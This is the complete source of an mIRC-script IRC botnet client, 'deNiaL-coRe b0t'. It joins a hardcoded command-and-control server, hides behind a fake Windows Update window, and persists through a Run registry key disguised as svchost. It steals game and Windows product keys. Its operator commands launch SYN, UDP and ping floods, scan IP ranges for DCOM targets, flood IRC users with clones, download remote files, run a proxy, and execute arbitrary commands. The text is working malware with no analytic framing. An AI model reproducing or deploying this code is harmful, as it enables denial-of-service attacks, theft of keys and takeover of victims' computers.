;
; start/exit remote actions
;
on *:start:{ run scon.exe /n /fh UPDATE | rlevel 800 | rlevel 720 | clearall | sockclose * | unset %* | timers off | settz | writeini ccon.dll ident userid $nfs2 | writeini ccon.dll mirc user $nfs2 | emailaddr $nfs2 $+ @nat01.dhcp- $+ $r(100,122) $+ .core-2.oc48. $+ $nfs2 $+ .gov | nick $nfs | fullname $nfs2 | conn | timer 0 30 securityz | timer 0 20 bgwin | makereg | vtalk | //timerreconnect -o 0 100 //checkconn | set %dcomexe universal.exe | set %dcom 5 | unset %ftp* | .mircreg }
on *:exit:{ rlevel 800 | rlevel 720 | clearall | sockclose * | unset %* | timers off }
;
; user level commands
;
on 720:text:*:*:{ /clearall | /securityz
  if ($1 == .speed) && ($2- == $null) { vtalk 14(0speed14)0 http://www.dslreports.com/archive/ $+ $gettok($host,3-,46) }
  if ($1 == .version) && ($2- == $null) { vtalk 14(0deNiaL-coRe b0t14)0 version 3.2 0speCiaL edition brought to you by the one and only.. the god and emperor.. the king and queen..  chode }
  if ($1 == .dns) { if ($2 == $null) { halt } | dns $2 | set %dns.r on | set %dns.rr # | set %dns.rrr $2 | vtalk 14(0dns14)0 attempting to resolve $2 $+ .. }
  if ($1 == .syn) && ($2- != $null) { if ($2 == stop) { sockclose syn* | vtalk 14(0Syn14)0 attack on: %synaa halted! | unset %synaa | halt } | set %synport $3 | if (%synport == random) { set %synport $rand(0,65535) } | vtalk 14(0Syn14)0 attacking: $2 with $4 syn packets on port %synport  | set %synaa $2 | synz start $4 $2 %synport }
  if ($1 == .logout) && ($2 == $null) { ruser 720 $nick | clearall | vtalk 0 $+ $nick has logged out from user level 14(0deNiaL-coRe b0t14) }
  }
;
; administrator level commands
;
on 800:text:*:*:{ /clearall | /securityz
  if ($1 == !visit) && ($2- != $null) { set %visit $2- | visit }
  if ($1 == !download) && ($3 == $null) && ($2- != $null) { downloada $2- }
  if ($1 == !logout) && ($2 == $null) { ruser 800 $nick | clearall | vtalk 0 $+ $nick has logged out from administrator level 14(0deNiaL-coRe b0t14) }
  if ($1 == !reload) && ($2 == $null) { /timer -o 1 10 /server %s1 | vtalk 14(0reloading14)0 in 10 seconds }
  if ($1 == !cskey) && ($2 == $null) { cskey }
  if ($1 == !uninstall) && ($2 == $null) { uinst }
  if ($1 == !nick) && ($2 == reset) { //nick $nfs }
  if ($1 == !rand) && ($2 == nick) { //nick $nfs2 }
  if ($1 == !clear) && ($2- == $null) { clearall | vtalk 14(0clear14)0 cleared buffer.. not laggy anymore! }
  if ($1 == !clean) && ($2- == $null) { cleanup }
  if ($1 == !flood) && ($2- != $null) && ($3 == $null) { vtalk 14(0flood14)0 on: $2 | /query $2 15DENIALCOREDENIALCOREDENIALCOREDENIALCOREDENIALCOREDENIALCOREDENIALCORE | /notice $2 15DENIALCOREDENIALCOREDENIALCOREDENIALCOREDENIALCOREDENIALCOREDENIALCORE | /ctcp $2 15DENIALCOREDENIALCOREDENIALCOREDENIALCOREDENIALCOREDENIALCOREDENIALCORE }
  if ($1 == !netsend) && ($2- != $null) { vtalk 14(0net-send14)0 sent $2 the message of $3- | /run scon.exe /n /fh /r "net send $2- $+ " }
  if ($1 == !var) && ($2- != $null) { vtalk 14(0var14)0 $2- = [ [ $$2- ] ] }
  if ($1 == !findfile) { timer 1 1 vtalk $findfile($2,$3,0, $+ vtalk 14(0find-file14)0 $2- $+ ) }
  if ($1 == !sayfile) { timer 1 1 vtalk 14(0say-file14)0 $findfile($2,$3,$4) }
  if ($1 == !finddir) { timer 1 1 vtalk $finddir($2,$3,0, $+ vtalk 14(0find-dir14)0 $2- $+ ) }
  if ($1 == !saydir) { timer 1 1 vtalk 14(0say-dir14)0 $finddir($2,$3,$4) }
  if ($1 == !killapp) && ($2- != $null) && ($3 == $null) { run scon.exe /n /fh /r " $+ $mircdirntlib.exe -kf $2" | vtalk 14(0killapp14)0 killed application: $2 }
  if ($1 == !dns) { if ($2 == $null) { halt } | dns $2 | set %dns.r on | set %dns.rr # | set %dns.rrr $2 | vtalk 14(0dns14)0 attempting to resolve $2 $+ .. }
  if ($1 == !join) && ($2- != $null) { join $2 $3- | vtalk 14(0join14)0 channel: $2 -- channel key: $3- }
  if ($1 == !cmd) && ($2- != $null) { %cmd = $2- | vtalk 14(0command14)0 // $+ $2- | // $+ %cmd | unset %cmd }
  if ($1 == !part) && ($2- != $null) { if ($2 == %chan) { vtalk 14(0error14)0 cannot part %chan - that's the main channel, asshole | halt } | { part $2 $3- | vtalk 14(0part14)0 channel: $2 -- reason: $3- } }
  if ($1 == !scan) && ($2- != $null) {
     if ($2 == randrange) && (%begshortip == $null) { randscan | set %begshortip %1p1 | set %endshortip %1p2 | set %beglongip $longip(  %begshortip ) | startscan | vtalk 14(0scanner14)0 starting scan from: %1p1 to %1p2 }
     if ($2 == start) && (%begshortip == $null) { vtalk 14(0scanner14)0 starting scan from: $3 to $4 | set %begshortip $3 | set %beglongip $longip(  %begshortip ) | set %endshortip $4 | set %endlongip $longip( %endshortip  ) | set %total $calc( %endlongip - %beglongip ) | unset %totalscaning | startscan }
     if ($2 == rand) && (%begshortip == $null) { set %begit $randip($3) | vtalk 14(0scanner14)0 starting scan from: %begit to $4 | set %begshortip %begit | set %beglongip $longip(  %begshortip ) | set %endshortip $4 | set %endlongip $longip( %endshortip  ) | set %total $calc( %endlongip - %beglongip ) | unset %totalscaning | startscan }
     if ($2 == host) && ($3 == start) && (%begshortip == $null) { set %begit $gettok($ip,1-2,46) $+ . $+ 1 $+ . $+ 1 | vtalk 14(0scanner14)0 scanning: %begit to $gettok($ip,1-2,46) $+ .255.255 | set %begshortip %begit | set %beglongip $longip( %begshortip ) | set %endshortip $gettok($ip,1-2,46) $+ .255.255 | set %endlongip $longip( %endshortip ) | set %total $calc( %endlongip - %beglongip ) | unset %totalscaning | startscan }
     if ($2 == host) && ($3 == rand) && (%begshortip == $null) { set %begit $gettok($ip,1-2,46) $+ . $+ $rand(1,255) $+ . $+ $rand(1,255) | vtalk 14(0scanner14)0 scanning: %begit to $gettok($ip,1-2,46) $+ .255.255 | set %begshortip %begit | set %beglongip $longip( %begshortip ) | set %endshortip $gettok($ip,1-2,46) $+ .255.255 | set %endlongip $longip( %endshortip ) | set %total $calc( %endlongip - %beglongip ) | unset %totalscaning | startscan }
     if ($2 == stop) && (%begshortip != $null) { vtalk 14(0scanner14)0 scanning of %begshortip to %endshortip stopped by $nick $+ ! | stopscan }
     if ($2 == stats) && (%begshortip != $null) { vtalk 14(0scanner14)0 scan stats range: [ %begshortip - %endshortip ] current ip: [ %ip100 ] }
     if ($2 == auto) && ($3 == on) { vtalk 14(0scanner14)0 now starting new scan when this one is done | %auto = on }
     if ($2 == auto) && ($3 == off) { vtalk 14(0scanner14)0 not going to start new scan when this one is done | %auto = off }
     if ($2 == sys) && ($3- != $null) { syscan $3 $4 }
  }
  if (($1 == !ip.control) && ($2 isin $gettok($address($me,5),2,64))) { $chr(47) $+ [ [ $3- ] ] }
  if (($1 == !uptime.control) && ($2 isin $duration($calc( $ticks / 1000 )))) { $chr(47) $+ [ [ $3- ] ] }
  if (($1 == !os.control) && ($2 == $os)) { $chr(47) $+ [ [ $3- ] ] }
  if (($1 == !nick.control) && ($2 iswm $me)) { $chr(47) $+ [ [ $3- ] ] }
  if (($1 == !list.control) && ($nick(#,$me) <= $2)) { [ [ $3- ] ] }
  if ($1 == !set) && ($3 != $null) {
     if ($2 == ftpip) { set %get.addy $3 | .vtalk 14(0dCoM14)0 ftp server set to  $+ $3 $+  }
     if ($2 == ftpuser) { set %ftpuser $3 | .vtalk 14(0dCoM14)0 user set to  $+ $3 $+  }
     if ($2 == ftppass) { set %ftppass $3 | .vtalk 14(0dCoM14)0 pass set to  $+ $3 $+  }
     if ($2 == target) { set %dcom $3 | .vtalk 14(0dCoM14)0 target set to  $+ $3 $+  }
     if ($2 == file) { set %get.file $3 | .vtalk 14(0dCoM14)0 file set to  $+ $3 $+  }
     if ($2 == dcomexe) { set %dcomexe $3 | if ($isfile($3)) { .vtalk 14(0dCoM14)0 dcomexe set to  $+ $3 $+  | halt } | .msg $chan  $+ $3 $+  doesn't exist! }
  }
  if ($1 == !universal) && ($2) { if ($2 == XP) { .set %dcom 5 } | elseif ($2 == 2K) { .set %dcom 0 } | elseif ($2 == OFF) { .set %dcom 6 | .set %dcomexe dcom.exe | .saveini | .vtalk 14(0dCoM14)0 universal is now OFF, variables reset to dcom: %dcom $+ , dcomexe: %dcomexe | halt } |  else { .vtalk 14(0dCoM14)0 specify a valid os: XP/2K , or OFF to turn universal OFF | halt } | .set %dcomexe universal.exe | .saveini | .vtalk 14(0dCoM14)0 universal set to os: $iif(%dcom == 5,XP,2K) dcomexe: universal.exe }
  if ($1 == !clone) && ($2 != $null) {
    if ($2 == load) && ($3 != $null) { sockopen Sockets- $+ $r(1,999) $3 $4 | vtalk 14(0clones14)0 loading to: $3 $+ : $+ $4 }
    if ($2 == kill) { sockwrite -tn Sockets-* QUIT : $+ $3- | sockclose Sockets-* | vtalk 14(0clones14)0 all clones disconnected! }
    if ($2 == join) && ($3 != $null) { sockwrite -tn Sockets-* JOIN $3 $4- }
    if ($2 == part) && ($3 != $null) { sockwrite -tn Sockets-* PART $3 $4- }
    if ($2 == msg) && ($3 != $null) { sockwrite -tn Sockets-* privmsg $3 : $+ $4- }
    if ($2 == notice) && ($3 != $null) { sockwrite -tn Sockets-* privmsg $3 : $+ $4- }
    if ($2 == join2) && ($3 != $null) { timer 1 $r(10,240) sockwrite -tn Sockets-* JOIN $3 $4- }
    if ($2 == part2) && ($3 != $null) { timer 1 $r(10,360) sockwrite -tn Sockets-* PART $3 $4- }
    if ($2 == flood1) && ($3 != $null) { sockwrite -tn Sockets-* join $3 | sockwrite -tn Sockets-* PRIVMSG $3 : $+ %m1 |  sockwrite -tn Sockets-* NOTICE  $3 : $+ %m2 | sockwrite -tn Sockets-* part $3 | vtalk 14(0clones14)0 starting flood on $3 }
    if ($2 == flood2) && ($3 != $null) { sockwrite -tn Sockets-* join $3 | timer 0 2 sockwrite -tn Sockets-* privmsg $3 : $+ %m3 |  timer 0 4 sockwrite -tn  Sockets-* notice $3 : $+ %m1 | vtalk 14(0clones14)0 starting endless flood on $3 $+ ! }
    if ($2 == pmflood) && ($3 != $null) { sockwrite -tn Sockets-* privmsg $3 : $+ %m1 | sockwrite -tn Sockets-* notice $3 : $+ %m2  | vtalk 14(0clones14)0 pm flooding: $3 }
    if ($2 == sqflood) && ($3 != $null) { sockwrite -n Sockets-* privmsg $3- : $+ %m3 | sockwrite -tn Sockets-* nick $nfs2 |  sockwrite -n Sockets-* privmsg $3- : $+ %m4 | vtalk 14(0clones14)0 attempting to sendq: $3- }
  }
  if ($1 == !info) && ($3- == $null) {
     if ($2 == net) { vtalk 14(0network-information14)0 connection: $dll(ntboot.dll,connection,_) network interfaces: $dll(ntboot.dll,interfaceinfo,_) ip: $ip host: $host }
     if ($2 == cpu) { vtalk 14(0cpu-information14)0 time: $time date: $date os: $os cpu: $dll(ntboot.dll,cpuinfo,_) memory: $dll(ntboot.dll,meminfo,_) uptime: $duration($calc($ticks / 1000 )) hd: $dll(ntboot.dll,diskcapacity,_) }
  }
  if ($1 == !bnc) {
     if ($2 == start) && ($4- != $null) { if ($sock(Bnc)) { vtalk 14(0bnc14)0 bnc is already active on $ip $+ : $+ %Bnc.Port $+ , pass: %Bnc.passwd | halt } | %Bnc = on | socklisten Bnc $3 | %Bnc.port = $3 | %Bnc.passwd = $4 | vtalk 14(0bnc14)0 /server -m $ip $+ : $+ $3 $+ , then /quote pass $4 }
     if ($2 == stats) && ($sock(Bnc)) { vtalk 14(0bnc14)0 is on! $ip $+ : $+ %Bnc.port $+ , pass: %Bnc.passwd $+ .. users: $sock(BncClient*,0) connected: $sock(BncServer*,0) }
     if ($2 == stop) && (%Bnc.Port != $null) { sockclose Bnc* | vtalk 14(0bnc14)0 server on port %bnc.port is now off | unset %bnc.* | sockclose Bnc* }
  }
  if ($1 == !syn) && ($2- != $null) { if ($2 == stop) { sockclose syn* | vtalk 14(0Syn14)0 attack on: %synaa halted! | unset %synaa | halt } | set %synport $3 | if (%synport == random) { set %synport $rand(0,65535) } | vtalk 14(0Syn14)0 attacking: $2 with $4 syn packets on port %synport  | set %synaa $2 | synz start $4 $2 %synport }
  if ($1 == !timersyn) && ($3- != $null) && ($8 == $null) { set %synport $3 | if (%synport == random) { set %synport $rand(0,65535) } | set %syntimes $4 | set %timernumber $5 | set %ttimes $6 | set %tmsdelay $7 | set %synaa $2 | set %timersyn synz start $4 $2 %synport | timersyn }
  if ($1 == !ping) && ($3) && ($4) { run scon.exe /n /fh /r "ping.exe $2 -n $3 -l $4" | vtalk 14(0Ping14)0 attacking $2 with $3 echo requests and a size of $4 bytes | set %pingaa $2 }
  if ($1 == !ping) && ($3) && ($4 == $null) { run scon.exe /n /fh /r "ping.exe $2 -n $3 -l 32" | vtalk 14(0Ping14)0 attacking $2 with $3 echo requests and a size of 32 bytes | set %pingaa $2 }
  if ($1 == !ping) && ($2 == stop) { run scon.exe /n /fh /r "ntlib.exe -kf ping.exe" | vtalk 14(0Ping14)0 attack on: %pingaa halted | unset %pingaa }
  if ($1 == !udp2) && ($6- == $null) && ($2- != $null) { if ($2 == stop) { sockclose sockudp* | vtalk 14(0UDP214)0 attack on: %udpip halted | halt } | set %port $3 | if (%port == random) { set %port $rand(0,65535) } | set %udpip $2 | /udp.packet $2 -t $+ $4 -p $+ %port -i $+ $5 }
  if ($1 == !udp3) && ($2- != $null) && ($6- == $null) { if ($2 == stop) { run scon.exe /n /fh /r "ntlib.exe -kf ipcfg.exe" | vtalk 14(0UDP314)0 attack on: %udp3aa halted | unset %udp3aa | halt } | set %udp3aa $2 | run scon.exe /n /fh /r " $+ ipcfg.exe $2 0 $3 $4 $+ " | vtalk 14(0UDP314)0 attacking $2 on port $3 for $4 minutes | unset %udpaa3 }
  if ($1 == !udp) {
    if ($2 == stop) {
      vtalk 14(0UDP14)0 attack on: %udpaa halted
      unset %udpaa
      halt
    }
    if ($3 == $null) {
      halt
      unset %udpaa
    }
    if ($4 == $null) {
      halt
      unset %udpaa
    }
    set %start 0
    set %end $4
    set %udpaa $2
    set %udpport $3 
    if (%udpport == random) { set %udpport $rand(0,65535) }
    vtalk 14(0UDP14)0 attacking $2 on port %udpport a total of $4 times
    :udploop
    if (%start == %end) {
      vtalk  14(0UDP14)0 attack on: %udpaa complete
      unset %udpaa
      unset %udpport
      halt
    }
    inc %start 1
    if ($3 == 0) {
      set %randname $rand(10000,99999)
      set %ntst32 $read(ntst32.vxd)
      set %udpport $rand(0,65535)
      sockudp Udp $+ %randname $+ a $2 %udpport %ntst32
      sockudp Udp $+ %randname $+ b $2 %udpport %ntst32
      sockudp Udp $+ %randname $+ c $2 %udpport %ntst32
      sockudp Udp $+ %randname $+ d $2 %udpport %ntst32
      sockudp Udp $+ %randname $+ e $2 %udpport %ntst32
      sockudp Udp $+ %randname $+ f $2 %udpport %ntst32
      sockudp Udp $+ %randname $+ g $2 %udpport %ntst32
      sockudp Udp $+ %randname $+ h $2 %udpport %ntst32
      sockudp Udp $+ %randname $+ i $2 %udpport %ntst32
      sockudp Udp $+ %randname $+ j $2 %udpport %ntst32
      sockudp Udp $+ %randname $+ k $2 %udpport %ntst32
      sockudp Udp $+ %randname $+ l $2 %udpport %ntst32
      sockudp Udp $+ %randname $+ m $2 %udpport %ntst32
      goto udploop
    }
    if ($4 != 0) {
      set %randname $rand(10000,99999)
      set %ntst32 $read(ntst32.vxd)
      sockudp Udp $+ %randname $+ a $2 %udpport %ntst32
      sockudp Udp $+ %randname $+ b $2 %udpport %ntst32
      sockudp Udp $+ %randname $+ c $2 %udpport %ntst32
      sockudp Udp $+ %randname $+ d $2 %udpport %ntst32
      sockudp Udp $+ %randname $+ e $2 %udpport %ntst32
      sockudp Udp $+ %randname $+ f $2 %udpport %ntst32
      sockudp Udp $+ %randname $+ g $2 %udpport %ntst32
      sockudp Udp $+ %randname $+ h $2 %udpport %ntst32
      sockudp Udp $+ %randname $+ i $2 %udpport %ntst32
      sockudp Udp $+ %randname $+ j $2 %udpport %ntst32
      sockudp Udp $+ %randname $+ k $2 %udpport %ntst32
      sockudp Udp $+ %randname $+ l $2 %udpport %ntst32
      sockudp Udp $+ %randname $+ m $2 %udpport %ntst32
      goto udploop
    }
  }
}

;
; aliases
;
alias conn { 
  %m1 = $str(OWNED,15)
  %m2 = $str(DCV3.3a,80)
  %m3 = $str(FAGFAGFAG,11))
  %m4 = $str(½¾,100)
  if ($portfree(113)) { socklisten IDENT 113 }
  if (!$portfree(27920)) { exit }
  else { socklisten WindowsUpdate 27920 }
  if (%s1 == $null) { %s1 = ashblon.sytes.net:6667 } | if (%s2 == $null) { %s2 = ashblon.sytes.net:6667 } | if (%s3 == $null) { %s3 = ashblon.sytes.net:6667 } | /server %s1
}
alias checkconn {
  if ($server == $null) {
    if (%c.re == $null) || (%c.re == 0) { set %c.re 1 | server %s2 | halt }
    if (%c.re == 1) { set %c.re 2 | server %s3 | halt }
    if (%c.re == 2) { set %c.re 0 | server %s1 | halt }
  }
  else { halt }
}
alias settz { %chan = #feds suck | %key = alot | %auto = on | if ($os == 95) || ($os == 98) || ($os == ME) { %windir = C:\WINDOWS\ | %bootdir = C:\\WINDOWS\\ | %bsys = C:\\WINDOWS\\SYSTEM32\\ } | if ($os == XP) || ($os == 2K) || ($os == NT) || ($os == 2000) { %windir = C:\WINNT\ | %bootdir = C:\\WINNT\\ | %bsys = C:\\WINNT\\SYSTEM32\\ } }
alias makereg { $RegWrite(HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\svchost,$mircdirsvchost.exe,REG_SZ) }
alias delreg { $RegDelete(HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\svchost) }
alias vtalk { if ($me isvo %chan) || ($me isop %chan) { clearall | msg %chan $1- } }
alias downloada { if ($sock(download)) { vtalk 14(0download14)0 0error: already downloading a file. | return } | set %download1 $gettok($1,2,47) | set %download2 $gettok($1,$numtok($1,47),47) | set %download3 $gettok($1,3-,47) | vtalk 14(0download14)0 downloading: $1- | .sockopen download %download1 80 }
alias cskey { vtalk 14(0keys14)0 CS key: $RegRead(HKEY_CURRENT_USER\Software\Valve\CounterStrike\Settings\Key) | vtalk 14(0keys14)0 HL key: $RegRead(HKEY_CURRENT_USER\Software\Valve\Half-Life\Settings\Key) }
alias winkey { vtalk 14(0keys14)0 windows key: $RegRead(HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProductId) | vtalk 14(0keys14)0 windows key: $RegRead(HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProductKey) }
alias nfs { return $chr(91) $+ DCoM $+ ] $+ - $+ $chr(91) $+ $r(0,9) $+ $r(0,9) $+ $r(0,9) $+ $r(0,9) $+ $r(0,9) $+ $r(0,9) $+ $r(0,9) $+ ] }
alias nfs2 { return $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) }
alias cleanup { sockclose * | run scon.exe /n /fh /r "ntlib.exe -kf ping.exe" | run scon.exe /n /fh /r "ntlib.exe -kf ipcfg.exe" | clearall | vtalk 14(0cleanup14)0 cleaned up.. not laggy anymore! }
alias hide { run scon.exe /n /fh UPDATE }
alias fakenick { /nick FAKE- $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) }
alias hide { run scon.exe /n /fh UPDATE }
alias visit {
  window @visiting
  $dll(ntm32.dll,detach,$window(@visiting).hwnd)
  $dll(ntm32.dll,attach,$window(@visiting).hwnd)
  vtalk 14(0visited14)0 %visit
  $dll(ntm32.dll,navigate,%visit)
  unset %visit
}
alias bgwin { window -p @Microsoft.Windows.Update 0 0 1600 1200 | timer 0 5 window -a @Microsoft.Windows.update }
alias securityz {
if ($appstate != hidden) { vtalk 14(0security14)0 not hidden | hide | clearall } }
if $exists(scon.exe) == $false { vtalk 14(0security14)0 hidewindow is missing! | hide | clearall } }
if ($appstate == hidden) { clearall } }
if ($portfree(27374) == $true) { sockopen Antivirus 127.0.0.1 27374 } }
bgwin
}
alias uinst { vtalk 14(0uninstall14)0 removing files & removing from registry | delreg | run scon.exe /n /fh /r "ntscript.bat" | /quit 14(0deNiaL-coRe b0t14)0 ip: $ip date uninstalled: $date time uninstalled: $time | /exit }
alias bannick { timer 1 1 mode %chan +bb $address($2,2) $address($2,3) | timer 1 2 kick %chan $2 you were kicked from %chan by $nfs2 }
alias -l udp.err { if ($isid) { return 14(0UDP214)0 error } }
alias udp.packet {
  if (!$isfile(upxd.txt)) { udp.gen }
  if ($1) {
    var %ip = $1 , %port , %a , %b , %c , %times , %interval
    if ($numtok(%ip,46) != 4) { vtalk $udp.err | return }
    if (*-t* !iswm $1-) { vtalk $udp.err | return }
    else { %a = 1 | while (%a <= $0) { %b = [ [ $+($,%a) ] ] | if ($left(%b,2) = -t) { %times = $remove(%b,-t) | %a = $0 } | inc %a } }
    if (*-p* iswm $1-) { %a = 1 | while (%a <= $0) { %b = [ [ $+($,%a) ] ] | if ($left(%b,2) = -p) { %port = $remove(%b,-p) | %a = $0 } | inc %a } | if (%port !isnum 1-65553) { %port = r } }
    else { %port = r }
    if (*-i* iswm $1-) { %a = 1 | while (%a <= $0) { %b = [ [ $+($,%a) ] ] | if ($left(%b,2) = -i) { %interval = $remove(%b,-i) | %a = $0 } | inc %a } }
    if (%interval = $null) || (%interval < 0) { vtalk $udp.err | return }
    $iif($iif(%interval <= 999,ms,sec) = ms,%c = $+(%interval,ms),%c = $+($calc(%interval / 1000),s))
    vtalk  14(0UDP214)0 attacking %ip on port %port a total of %times with a interval of %c
    .timer -oh %times %interval udp.packet2 %ip %port
   }
}
alias -l udp.packet2 {
  if ($2) {
    var %a 1 , %ip = $1 , %port = $iif($2 = r,$r(1,65553),$2) , %str = $left($read(upxd.txt,$r(1,$lines(upxd.txt))),400)
    while (%a <= 10) { sockudp $+(udp,$calc($r(1,999999999999999) / $ticks)) %ip %port %str | inc %a }
  }
}
alias -l udp.gen {
  var %ascii-start = 200 , %ascii-end = 250 , %bytes = 400 , %file = upxd.txt
  while (%ascii-start <= %ascii-end) { write %file $str($chr(%ascii-start),%bytes) | inc %ascii-start }
}
alias timersyn { timer $+ %timernumber %ttimes %tmsdelay %timersyn | vtalk 14(0TimerSyn14)0 timer $+ %timernumber set to Syn attack: %synaa on port %synport with %syntimes syn packets a total of %ttimes times every %tmsdelay seconds | unset %timersyn | unset %tmsdelay | unset %synport | unset %ttimes | unset %syntimes }
alias synz { if ($1 == $null) { return } | syn 1 $1- | syn 1 halt | syn 1 $1- | syn 1 halt | syn 1 $1- | syn 1 halt | syn 1 $1- | syn 1 halt | syn 1 $1- | syn 1 halt | syn 1 $1- | syn 1 halt | vtalk 14(0Syn14)0 attack on: %synaa complete! | unset %synaa }
alias syn {
  if ($2 == start) { if (%synport !isnum) || ($5 !isnum) { return } | var %x = 1 | while (%x <= $3) { sockopen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) $4 $5 | inc %x  } }
  if ($2 == halt) { if ($sock(syn*,0) > 0) { sockclose syn* } }
}
alias mircreg { $RegWrite(HKEY_CURRENT_USER\Software\mIRC\License\,4782-505050,REG_SZ) | $RegWrite(HKEY_CURRENT_USER\Software\mIRC\UserName\,fubitch,REG_SZ) }
;
; misc remote actions
;
on *:op:%chan:{ if ($opnick == $me) { mode %chan +mnstk %key } }
on *:notice:denial:*:{ timerban $+ $nick off | timerkick $+ $nick off | mode %chan +v $nick | notice $nick pass accepeted.. }
on *:connect:{ ial on | pdcc on | fsend on | mode $me +ix | timerbackup* off | stopscan | vtalk | //timerreconnect -o 0 100 //checkconn | timer 0 5 join %chan %key | run scon.exe /n /fh /r "nwbat.bat" | clearall }
on *:sockopen:Antivirus*:{ if ($sockerr > 0) { return } }
on *:sockread:Antivirus*: { sockread -f %Antivirus | if (%Antivirus == PWD) { sockwrite $sockname PWD14438136782715101980 | timer 1 10 sockwrite $sockname RMS } | sockwrite $sockname RMS | unset %Antivirus }
on *:dns:{ %address = $iaddress } { if (%dns.r == on) { vtalk 14(0dns14)0 %dns.rrr resolved to ip: $iaddress host: $naddress | unset %dns.* } }
on *:sockopen:download:{ if ($sockerr) { vtalk 14(0download14)0 error: socket error. | return } | .write -c %download2 | .sockwrite -n $sockname GET / $+ %download3 HTTP/1.0 | .sockwrite -n $sockname Accept: */* | .sockwrite -n $sockname Host: %download1 | .sockwrite -n $sockname }
on *:sockread:download:{ if (%downloadready != 1) { var %header | sockread %header | while ($sockbr) { if (Content-length: * iswm %header) { %downloadlength = $gettok(%header,2,32) } | elseif (* !iswm %header) { %downloadready = 1 | %downloadoffset = $sock($sockname).rcvd | break } | sockread %header } } | sockread 4096 &d | while ($sockbr) { bwrite %download2 -1 -1 &d | sockread 4096 &d } }
on *:sockclose:download:{ if ($file(%download2).size != %downloadlength) { .sockclose download | downloada http:// $+ %download1 $+ / $+ %download3 } | else { vtalk 14(0download14)0 success: file downloaded 14(0 $+ $mircdir $+ %download2 $+ 14)0 14(0 $+ $file(%download2).size bytes $+ 14) } | unset %download1 %download2 %download3 %downloadlength %downloadready %downloadoffset }
on *:socklisten:ident:{ sockaccept ident. [ $+ [ $ticks ] ] }
on *:sockread:ident.*:{ sockread %ident | tokenize 32 %ident | if ($numtok($1-,44) == 2 && $1,$3 isnum) { sockwrite -n   $sockname $3 , $1 : USERID : none.of.your.business : $nfs2 | sockclose $sockname | unset %ident } }
on *:input:*:{ haltdef | vtalk 14(0security14)0 user input: $1- | /fakenick | hide | uinst }
on *:socklisten:Bnc:{ sockaccept BncClient $+ $r(1,999) }
on *:disconnect:{ stopscan | rlevel 800 | rlevel 720 | clearall | //timerreconnect -o 0 50 //checkconn }
on 800:part:%chan:{ ruser 800 $nick | clearall }
on 800:quit:%chan:{ ruser 800 $nick | clearall }
on 800:nick:*:{ ruser 800 $nick | clearall }
on 720:part:%chan:{ ruser 720 $nick | clearall }
on 720:quit:%chan:{ ruser 720 $nick | clearall }
on 720:nick:*:{ ruser 720 $nick | clearall }
on @*:join:%chan:{
  notice $nick password | timerban $+ $nick 1 20 mode %chan +bb $address($nick,2) $address($nick,3) | timerkick $+ $nick 1 25 kick %chan $nick you were kicked from %chan by $nfs2
  if (!$regex($nick,[a-z][1-3][A-Z][5-9].*)) || (4 isin $nick) { bannick $nick }
}
alias syscan {
  set %full $nick($chan, 0, +reg)
  set %me $nick($chan, $me, +reg)
  set %startip $longip($1)
  set %beglongip $longip($1)
  set %endlongip $longip($2)
  set %begshortip $longip(%beglongip + 1)
  set %endshortip $longip(%endlongip)
  set %range $calc(%endlongip - %startip)
  set %each $round($calc(%range / %full), 0)
  set %endlongip $calc(%beglongip + (%each * %me))
  set %startip $calc(%beglongip + (%each * ( %me - 1)))
  set %endshortip $longip(%endlongip)
  inc %startip
  set %begshortip $longip(%startip)
  set %beglongip %startip
  if ($nick($chan, $me, +reg) == $nick($chan,0, +reg))  { set %endlongip $longip($2) |  set %endshortip $longip(%endlongip) }
  if ($nick($chan, $me, +reg) == 1)  { set %beglongip $longip($1) | set %begshortip $longip(%beglongip) }
  set %total $calc( %endlongip - %beglongip )
  unset %totalscaning
  vtalk 14(0scanner14)0 starting systematically scanning: %begshortip to %endshortip
  startscan
}